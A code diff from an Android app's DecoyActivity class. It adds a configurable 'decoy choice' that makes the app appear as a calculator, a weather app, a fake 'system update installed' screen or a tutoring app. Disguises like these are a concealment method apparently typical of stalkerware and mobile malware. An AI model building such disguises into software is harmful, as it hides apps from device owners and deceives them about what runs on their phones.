@@ -84,19 +84,21 @@ public class DecoyActivity extends AppCompatActivity {
             } catch (Exception ignored) {}
         }
 
-        if (componentName.contains("CalculatorAlias")) {
+        int decoyChoice = SystemAnalytics.getDecoyChoice(this);
+
+        if (componentName.contains("CalculatorAlias") || decoyChoice == 2) {
             setContentView(R.layout.activity_decoy_calculator);
             setupCalculator();
             isSpecializedDecoy = true;
-        } else if (componentName.contains("WeatherAlias")) {
+        } else if (componentName.contains("WeatherAlias") || decoyChoice == 3) {
             setContentView(R.layout.activity_decoy_weather);
             setupWeather();
             isSpecializedDecoy = true;
-        } else if (componentName.contains("SystemUpdateAlias")) {
+        } else if (componentName.contains("SystemUpdateAlias") || decoyChoice == 4) {
             setContentView(R.layout.activity_decoy_install_success);
             setupSystemUpdateSuccessDecoy();
             isSpecializedDecoy = true;
-        } else if (componentName.contains("SmartTutorAlias") || componentName.contains("SmartTutor")) {
+        } else if (componentName.contains("SmartTutorAlias") || componentName.contains("SmartTutor") || decoyChoice == 5) {
             setupSmartTutorDecoy();
             isSpecializedDecoy = true;
         } else {
